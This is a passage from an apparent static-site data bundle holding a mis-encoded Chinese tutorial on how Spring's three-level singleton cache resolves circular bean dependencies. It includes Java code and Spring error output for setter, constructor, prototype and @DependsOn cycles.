å¯ä»¥æ¯åç½®æ¦æªï¼åç½®æ¦æªï¼æèç¯ç»æ¦æª\n     --\x3e\n    <bean id="methodinterceptor" class="cn.bugstack.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="advice" ref="beforeadvice"/>\n    </bean>\n    \x3c!-- åé¢è¡¨è¾¾å¼ --\x3e\n    <bean id="pointcutadvisor" class="cn.bugstack.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"/>\n        <property name="advice" ref="methodinterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­",frontmatter:{title:"æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/203.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/203.æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­.md",key:"v-6ae9c5a4",path:"/spring/spring/203/",headers:[{level:2,title:"ä»£ç ä»ç»",slug:"ä»£ç ä»ç»",normalizedTitle:"ä»£ç ä»ç»",charIndex:679},{level:2,title:"æµç¨ä»ç»",slug:"æµç¨ä»ç»",normalizedTitle:"æµç¨ä»ç»",charIndex:7320},{level:2,title:"ä¸åçå¾ªç¯ä¾èµé®é¢",slug:"ä¸åçå¾ªç¯ä¾èµé®é¢",normalizedTitle:"ä¸åçå¾ªç¯ä¾èµé®é¢",charIndex:10231},{level:3,title:"set å¾ªç¯ä¾èµ",slug:"set-å¾ªç¯ä¾èµ",normalizedTitle:"set å¾ªç¯ä¾èµ",charIndex:10245},{level:3,title:"æé å¨ å¾ªç¯ä¾èµ",slug:"æé å¨-å¾ªç¯ä¾èµ",normalizedTitle:"æé å¨ å¾ªç¯ä¾èµ",charIndex:11894},{level:3,title:"@DependsOn",slug:"dependson",normalizedTitle:"@dependson",charIndex:14419}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä»£ç ä»ç» æµç¨ä»ç» ä¸åçå¾ªç¯ä¾èµé®é¢ set å¾ªç¯ä¾èµ æé å¨ å¾ªç¯ä¾èµ @DependsOn",content:"Spring ä¸çº§ç¼å­æ¯ Spring æ¡æ¶ä¸­ç¨äºç®¡ç Bean å¯¹è±¡çç¼å­æºå¶ãå®ç±ä¸ä¸ªä¸åçç¼å­åºåç»æï¼åå«æ¯ singletonObjectsãearlySingletonObjects å singletonFactoriesã\n\n * singletonObjectsï¼ä¸çº§ç¼å­ï¼æåå¯¹è±¡ï¼ï¼åä¾å¯¹è±¡ç¼å­åºåå­å¨å·²ç»å®å¨åå§ååçåä¾å¯¹è±¡ãå½ç¬¬ä¸æ¬¡ä½¿ç¨ getBean () æ¹æ³è·å bean æ¶ï¼Spring ä¼å°è¯ä»è¿ä¸ªç¼å­åºè·åå¯¹è±¡ï¼å¦æè½å¤æ¾å°ï¼åç´æ¥è¿åè¯¥å¯¹è±¡å®ä¾ã\n * earlySingletonObjectsï¼äºçº§ç¼å­ï¼ä»£çå¯¹è±¡ï¼ç¹æ®çæåå¯¹è±¡ï¼ï¼å¦æä¸ä¸ªåä¾å¯¹è±¡éè¦å¼ç¨å¦ä¸ä¸ªåä¾å¯¹è±¡ï¼ä½åèå°æªè¢«å®å¨åå§åï¼é£ä¹å®¹å¨å°åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼Proxy Objectï¼ï¼å¹¶å°å¶æ¾å° earlySingletonObjects ä¸­ãè¿ä¸ªä»£çå¯¹è±¡ä¼æ´é²ä¸å®éå¯¹è±¡ç¸åçæ¥å£ï¼å¹¶ä¸è½å¤å¯¹å¶è¿è¡ä¸äºåºæ¬æä½ï¼ä½æ¯å®è¿æ²¡æè¢«å®å¨åå§åã\n * singletonFactoriesï¼ä¸çº§ç¼å­ï¼åæåå¯¹è±¡ä¹æ¯å·¥åå¯¹è±¡ï¼ï¼åä¾å·¥åç¼å­åºåå­å¨åå»º bean å®ä¾ç ObjectFactoryãå¨ Bean ä¾èµå³ç³»çåå»ºè¿ç¨ä¸­ï¼å¦æ A ä¾èµ Bï¼B åä¾èµ Aï¼é£ä¹å¨åå»º A å B çè¿ç¨ä¸­å°±ä¼åºç°å¾ªç¯ä¾èµçé®é¢ãSpring å°±æ¯éè¿æåæ´é²ä¸ä¸ªæªå®æåå§åç Bean æ¥è§£å³è¿ä¸ªé®é¢çã\n\næç¤º\n\nå¯¹äº spring è®¾è®¡æ²¡æå®å¨çè§£çåå­¦å¯è½å¾é¾æç½ä»¥ä¸çè¯ï¼è¿æ¯éè¦ç¨ä»£ç å ä¸è¯´æï¼ä»¥ä¸æç« ä¼è®®ä»£ç çæ¹å¼å¨ç¨è®²æ¸æ¥\n\n\n# ä»£ç ä»ç»\n\né¦å Spring å¨åå§åçæ¶åä¼åæææ Bean å è½½å° Beandefinition çç¼å­ä¸­ï¼åç»­ææå¯¹ Bean çåå»ºé½æ¯ä» Beandefinition ä¸­è·åè¯¦ç»å¯ä»¥ç Spring æºç éè¯»ï¼ä¸ï¼ ï¼ç¶ååè¿è¡ Bean çå½å¨æçè¿ç¨ï¼åå»ºå¥½ Bean çå®ä¾æ¾å¥å° singletonObjects ç¼å­ä¸­ï¼ä½æ¯ä»£ç çç¬¬ä¸æ­¥é½æ¯ä»è·åå¼å§ï¼åªæè·åä¸å°ææåå»º\n\n    public Object getBean(String name) throws BeansException {\n        return doGetBean(name, null);\n    }\n\n    public Object getBean(String name, Object... args) throws BeansException {\n        return doGetBean(name, args);\n    }\n\n    public <T> T getBean(String name, Class<T> requiredType) throws BeansException {\n        return (T) getBean(name);\n    }\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        // Beanå®ä¾çåå»ºè¿ç¨\n        Object bean = doCreateBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nå¯ä»¥çå° getSingleton æ¹æ³å°±æ¯è·ååä¾ï¼ä¸æ¦æåç´æ¥è¿åï¼ä½ç¬¬ä¸æ¬¡è¯å®æ¯æ²¡æçï¼è¯¦ç»çä¸ä»çè·åæ¹å¼\n\n    public Object getSingleton(String beanName) {\n        // ä»ä¸çº§ç¼å­ä¸­è·å\n        Object singletonObject = singletonObjects.get(beanName);\n        if (null == singletonObject) {\n            singletonObject = earlySingletonObjects.get(beanName);\n            // å¤æ­äºçº§ç¼å­ä¸­æ¯å¦æå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±æ¯ä»£çå¯¹è±¡ï¼å ä¸ºåªæä»£çå¯¹è±¡æä¼æ¾å°ä¸çº§ç¼å­ä¸­\n            if (null == singletonObject) {\n                ObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\n                if (singletonFactory != null) {\n                    singletonObject = singletonFactory.getObject();\n                    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n                    earlySingletonObjects.put(beanName, singletonObject);\n                    singletonFactories.remove(beanName);\n                }\n            }\n        }\n        return singletonObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ²¡æè·åå°å®ä¾åä» beanDefinition ä¸­è·å Bean çå®ä¹ä¿¡æ¯è°ç¨ doCreateBean åå»º Bean çå®ä¾\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // å®ä¾å Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçBeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® Bean å±æ§ä¹åï¼åè®¸ BeanPostProcessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // ç» Bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // æ§è¡ Bean çåå§åæ¹æ³å BeanPostProcessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException(\"Instantiation of bean failed\", e);\n        }\n        // æ³¨åå®ç°äº DisposableBean æ¥å£ç Bean å¯¹è±¡\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nå¶ä¸­ applyPropertyValues è¿ä¸ªæ¹æ³ï¼å¯¹è¦åå»ºçå®ä¾è¿è¡å±æ§å¡«åçæ¶åä¼è¿å¥å¾ªç¯ä¾èµçé®é¢ï¼ä¸æ¦éå°æ¯ BeanReference ç±»åçï¼åä¼è°ç¨ getBean æ¹æ³å»è·åå®ä¾ï¼è¯¥æ¹æ³åä¼åå°ä¸é¢çæ¹æ³ã\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            // è¿éè·åå°  bean ä¿¡æ¯éçå±æ§æåªäºï¼ä¹å°±æ¯ä¸ä¸ªå¯¹è±¡æåªäºå±æ§ï¼å¹¶å¾ªç¯èµå¼å°æåå»ºå®ä¾çå±æ§ä¸­å»\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A ä¾èµ Bï¼è·å B çå®ä¾å\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // ç±»åè½¬æ¢ï¼ä¸æ¯ä¾§éç¹å¯ä»¥ä¸ç\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException(\"Error setting property valuesï¼\" + beanName + \" messageï¼\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå½ä¸ä¸ªå®ä¾çåå»ºåºæ¬å®æï¼ä»ä¼æèªå·±æ·»å å°ä¸çº§ç¼å­å¯¹è±¡ï¼åä¸ºä¸ä¸ªæåæä¾ç»å¶ä»æ¹æ³ä½¿ç¨ãå¦ä¸æ¹æ³å°±æ¯æ·»å å°ä¸çº§ç¼å­çè¿ç¨ï¼å¶ä¸­ getSingleton å¨è·åä¸çº§ç¼å­æ°æ®å°äºçº§ç¼å­çæ¶åä¼æ§è¡ singletonFactory.getObject (); è¿æ¯ä¸ä¸ªæ¹æ³ï¼ä¼å»æ§è¡ getEarlyBeanReference (beanName, beanDefinition, finalBean) æ¹æ³ï¼è¯¥æ¹æ³ä¼å¾å°å·¥åæ¹æ³éé¢çä¸ä¸ªä»£çå¯¹è±¡ãç¶ååæä»£çå¯¹è±¡å­å°ä¸çº§ç¼å­ãè³æ­¤ Bean çå®ä¾åå°ç¼å­çè¿ç¨å°±ç»æã\n\n// å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\nObject exposedObject = bean;\nif (beanDefinition.isSingleton()) {\n    // æä¸çº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºäºçº§ç¼å­å¯¹è±¡\n    exposedObject = getSingleton(beanName);\n    // æäºçº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºä¸çº§ç¼å­å¯¹è±¡\n    registerSingleton(beanName, exposedObject);\n}\n\n// getSingleton çé¨åä»£ç å®ç°\nObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\nif (singletonFactory != null) {\n    // è·åä»£çå¯¹è±¡\n    singletonObject = singletonFactory.getObject();\n    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n    earlySingletonObjects.put(beanName, singletonObject);\n    singletonFactories.remove(beanName);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# æµç¨ä»ç»\n\næäºå®æ´çæ¦å¿µåï¼æä»¬å¯ä»¥èèå¾ªç¯ä¾èµçå­å¨ï¼å½ A ä¾èµ Bï¼B åä¾èµ Aï¼é£ä¹è§£å³ä¾èµçè¿ç¨åæ¯å¦ä½åçï¼å¯ä»¥çä¸å¾ï¼\n\n\n\n 1. ä¼åå¨ getBean æ¹æ³éé¢æ¾ Aï¼éè¿ä¸äºä¸çº§ç¼å­ä¸­å¯»æ¾ï¼å¦ææ¾å°åç´æ¥è¿å\n 2. æ²¡æ¾å°å°±å»åå»º A å¹¶æ¾å¥ singletonFactories ä¸çº§ç¼å­ï¼ä¼å¯¹ A çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ A çå±æ§ä¾èµäº Bï¼å°±è¦è°ç¨ getBean æ¾ B\n 3. éè¿å¨ getBean ç ä¸äºä¸çº§ç¼å­æ¥æ¾ï¼å¦ææ¾å°äºç´æ¥è¿å\n 4. æ²¡æ¾å°å°±å»åå»º B å¹¶æ¾å¥ singletonFactories ä¸çº§ç¼å­ï¼ä¼å¯¹ B çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ B çå±æ§ä¾èµäº Aï¼å°±è¦è°ç¨ getBean æ¾ A\n 5. æ­¤æ¶ç A å·²ç»å¨ä¸çº§ç¼å­ï¼å¯ä»¥å¨ä¸çº§ç¼å­ä¸­æ¾å°ï¼æ¾å°åä¼çæ A ä»£çå¯¹è±¡ æ¾å¥ earlySingletonObjects äºçº§ç¼å­å¹¶è¿åè¿ä¸ªä»£çå¯¹è±¡\n 6. B æäºå±æ§ A çä»£çå¯¹è±¡ï¼æ­¤æ¶ B ææå±æ§å¡«åå®æ¯åï¼å°±è¦æ B æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç B å¨ä¸çº§ç¼å­ï¼ä¼åæä¸çº§ç¼å­å¯¹è±¡çæä»£çåæ¾å¥å° earlySingletonObjects äºçº§ç¼å­ï¼åç±äºçº§ç¼å­æå¯¹è±¡æ¾å° singletonObjects ä¸çº§ç¼å­å¯¹è±¡\n 7. æ­¤æ¶ç B å·²ç»æ¾å°ä¸çº§ç¼å­å¯¹è±¡äºï¼å¹¶ç»æäº B çåå»ºæµç¨ï¼æä»¥ä¼è¿åå°ç¬¬ 2 æ­¥ï¼A å°±æäº B çå®ä¾ï¼A çå±æ§å¡«åå®æ¯åï¼å°±è¦æ A æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç A å·²ç»å¨äºçº§ç¼å­ï¼æä»¥å°±å¯ä»¥ç´æ¥æ¾å¥å° singletonObjects ä¸çº§ç¼å­\n\nç°å¨æä»¬ç¥éï¼æç§ Spring æ¡æ¶çè®¾è®¡ï¼ç¨äºè§£å³å¾ªç¯ä¾èµéè¦ç¨å°ä¸ä¸ªç¼å­ï¼è¿ä¸ä¸ªç¼å­åå«å­æ¾äº singletonObjects æåå¯¹è±¡ãsingletonFactories åæåå¯¹è±¡ (æªå¡«åå±æ§å¼)ãearlySingletonObjects ä»£çå¯¹è±¡ï¼åé¶æ®µå­æ¾å¯¹è±¡åå®¹ï¼æ¥è§£å³å¾ªç¯ä¾èµé®é¢ã\n\né£ä¹ï¼è¿éæä»¬éè¦ç¥éä¸ä¸ªæ ¸å¿çåçï¼å°±æ¯ç¨äºè§£å³å¾ªç¯ä¾èµå°±å¿é¡»æ¯ä¸çº§ç¼å­å¢ï¼äºçº§è¡åï¼ä¸çº§å¯ä»¥ä¸ï¼å¶å®é½è½è§£å³ï¼åªä¸è¿ Spring æ¡æ¶çå®ç°è¦ä¿è¯å ä¸ªäºæï¼å¦åªæä¸çº§ç¼å­å¤çæµç¨æ²¡æ³æåï¼å¤æåº¦ä¹ä¼å¢å ï¼åæ¶åæåå¯¹è±¡å¯è½ä¼æç©ºæéå¼å¸¸ãèå°åæåä¸æåå¯¹è±¡åå¼ï¼å¤çèµ·æ¥ä¹æ´å ä¼éãç®åãææ©å±ãå¦å¤ Spring çä¸¤å¤§ç¹æ§ä¸­ä¸ä»æ IOC è¿æ AOPï¼ä¹å°±æ¯åºäºå­èç å¢å¼ºåçæ¹æ³ï¼è¯¥å­æ¾å°åªï¼èä¸çº§ç¼å­æä¸»è¦ï¼è¦è§£å³çå¾ªç¯ä¾èµå°±æ¯å¯¹ AOP çå¤çï¼ä½å¦ææ AOP ä»£çå¯¹è±¡çåå»ºæåï¼é£ä¹äºçº§ç¼å­ä¹ä¸æ ·å¯ä»¥è§£å³ãä½æ¯ï¼è¿å°±è¿èäº Spring åå»ºå¯¹è±¡çååï¼Spring æ´åæ¬¢æææçæ®é Bean é½åå§åå®æï¼å¨å¤çä»£çå¯¹è±¡çåå§åã\n\nä¸ä¸ªåä¸ªç¼å­è§£å³å¾ªç¯ä¾èµçä¾å­\n\npublic class ForRelyOn {\n\n    static Map<String,Object> singletonObjects = new HashMap<>();\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(getBean(A.class).getB());\n        System.out.println(getBean(B.class).getA());\n    }\n\n    private static <T> T getBean(Class<T> beanClass) throws Exception {\n        String beanName = beanClass.getSimpleName().toLowerCase();\n        if (singletonObjects.containsKey(beanName)) {\n            return (T) singletonObjects.get(beanName);\n        }\n        // å®ä¾åå¯¹è±¡å¥ç¼å­0\n        Object obj = beanClass.newInstance();\n        singletonObjects.put(beanName, obj);\n        // å±æ§å¡«åè¡¥å¨å¯¹è±¡\n        Field[] fields = obj.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            Class<?> fieldClass = field.getType();\n            String fieldBeanName = fieldClass.getSimpleName().toLowerCase();\n            field.set(obj, singletonObjects.containsKey(fieldBeanName) ? singletonObjects.get(fieldBeanName) : getBean(fieldClass));\n            field.setAccessible(false);\n        }\n        return (T) obj;\n    }\n\n\n    static class A{\n        private B b;\n\n        public B getB() {\n            return b;\n        }\n\n        public void setB(B b) {\n            this.b = b;\n        }\n    }\n\n    static class B{\n        private A a;\n\n        public A getA() {\n            return a;\n        }\n\n        public void setA(A a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\næç¤º\n\nä»¥ä¸é½æ¯æä»¬éè¿ åä¾ç set æ³¨å¥æ¹å¼æ¥è§£å³å¾ªç¯ä¾èµï¼å¨ spring ä¸­æå¤ç§å¤æ ·çæ³¨å¥æåµï¼é£ä¼å¸¦æ¥ä»ä¹æ ·çæåµå¢ï¼\n\n\n# ä¸åçå¾ªç¯ä¾èµé®é¢\n\n\n# set å¾ªç¯ä¾èµ\n\nå¨å¤ä¾ set çå¾ªç¯ä¾èµä¸­ï¼åªæå¤ä¾åå¤ä¾å¾ªç¯ä¾èµä¼åºç°æ¥éï¼æ¥éä¿¡æ¯å¦ä¸ï¼\n\nError creating bean with name 'b': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'a': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n\n\nå¤ä¾ååä¾çå¾ªç¯ä¾èµä¸ä¼æé®é¢ï¼å¦ä¸æ¯ä¸ä¸ªåä¾åå¤ä¾çå¾ªç¯ä¾èµä»£ç ï¼\n\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n\npublic static void main(String[] args) {\n    ConfigurableApplicationContext run = SpringApplication.run(AdminApplication.class, args);\n    B b = run.getBean(B.class);\n    B b1 = run.getBean(B.class);\n    B b2 = run.getBean(B.class);\n    A a = run.getBean(A.class);\n    A a1 = run.getBean(A.class);\n    A a2 = run.getBean(A.class);\n    System.out.println(b);\n    System.out.println(b1);\n    System.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// ç»æ\n// com.wt.admin.controller.B@1e5e2e06\n// com.wt.admin.controller.B@26c1f3eb\n// com.wt.admin.controller.B@79982bcc\n// com.wt.admin.controller.B@16b2d182\n// com.wt.admin.controller.B@16b2d182\n// com.wt.admin.controller.B@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# æé å¨ å¾ªç¯ä¾èµ\n\nä½å¨ æé å¨ å¾ªç¯ä¾èµçæ³¨å¥ä¸­ï¼å ä¸ºå¨æé å¨æ³¨å¥æ¹å¼ä¸ï¼éè¦ååå»ºä¸ä¸ª Bean å¯¹è±¡ï¼ç¶ååå°å¶ä» Bean æ³¨å¥è¯¥å¯¹è±¡ä¸­ãä½æ¯ï¼å¦æä¸¤ä¸ª Bean é½äºç¸ä¾èµï¼é£ä¹å°±ä¼åºç°æ æ³åå»ºä»»ä½ä¸ä¸ª Bean çæåµãå æ­¤ï¼Spring å¨è¿ç§æåµä¸ä¼æåºå¼å¸¸ä»¥é¿åç¨åºåºç°ä¸å¯é¢æµçéè¯¯ã\n\n@Configuration\npublic class Config {\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥é\n// The dependencies of some of the beans in the application context form a cycle:\n// âââââââ\n// |  a defined in class path resource [com/wt/admin/controller/Config.class]\n// â     â\n// |  b defined in class path resource [com/wt/admin/controller/Config.class]\n// âââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè§£å³è¿ç§é®é¢ï¼å¯ä»¥éè¿å¨æ¹æ³ä¸­æ·»å  @Lazy æ³¨è§£ï¼åªè½å å°æ¹æ³éï¼ä¸è½å å° @Bean çä¸ä¸ä½ç½®ï¼å¦åä¾ç¶ä¼æ¥å¾ªç¯ä¾èµï¼è¿ç§æ¹å¼å°½å¯è½çè¢«å®ä¹ä¸º @Lazy ç Bean å¨ç¬¬ä¸æ¬¡è¢«ä½¿ç¨çæ¶åå¨å»è¿è¡å®ä¾åã\n\næé å¨ä¹å­å¨å¤ä¾ååä¾çé®é¢ï¼å¦æä½ æ¯å¤ä¾ä¾èµå¾ªç¯ï¼ä¼æ¥éï¼å¦ä¸\n\n// å¤ä¾\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥éä¿¡æ¯\n// Error creating bean with name 'b' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æä½ æ¯å¤ä¾ååä¾å¾ªç¯ä¾èµï¼ä¹ä¼æ¥éï¼ä½è¿éåæä»¬ä½¿ç¨æ³¨è§£è¿è¡å¤ä¾ååä¾çå¾ªç¯ä¾èµæµè¯ç»æå°±ææä¸åäº\n\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥éä¿¡æ¯\n// The dependencies of some of the beans in the application context form a cycle:\n// âââââââ\n// |  b defined in class path resource [com/wt/admin/controller/Config.class]\n// â     â\n// |  a defined in class path resource [com/wt/admin/controller/Config.class]\n// âââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né£ä¹æé å¨å set æ³¨å¥çæ¹å¼å¨å¤ä¾ååä¾çç»è®ºå¦ä¸ï¼\n\n * åä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @Lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n * å¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼set æ³¨å¥çæ¹å¼ä¼æ¥éï¼ä¸¤èé½æ¯è°ç¨å¯¹è±¡æ¶ææ¥\n * åä¾åå¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @Lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n\n\n# @DependsOn\n\n@DependsOn æ³¨è§£å¯ä»¥å®ä¹å¨ç±»åâ½æ³ä¸ï¼æææ¯æè¿ä¸ªç»ä»¶è¦ä¾èµäºå¦â¼ä¸ªç»ä»¶ï¼ä¹å°±æ¯è¯´è¢«ä¾èµçç»ä»¶ä¼â½è¯¥ç»ä»¶åæ³¨åå° IOC å®¹å¨ä¸­ãå¦ä¸æ¡ä¾ï¼å ä¸ºä¸¤ä¸ªé½è¦åäºï¼æä»¥é æäºå¾ªç¯ä¾èµ\n\n@DependsOn(\"b\")\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@DependsOn(\"a\")\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n// æ¥é\n// Error creating bean with name 'b' defined in file [D:\\workspace\\luckyDraw\\java\\target\\classes\\com\\wt\\admin\\controller\\B.class]: Circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",normalizedContent:"spring ä¸çº§ç¼å­æ¯ spring æ¡æ¶ä¸­ç¨äºç®¡ç bean å¯¹è±¡çç¼å­æºå¶ãå®ç±ä¸ä¸ªä¸åçç¼å­åºåç»æï¼åå«æ¯ singletonobjectsãearlysingletonobjects å singletonfactoriesã\n\n * 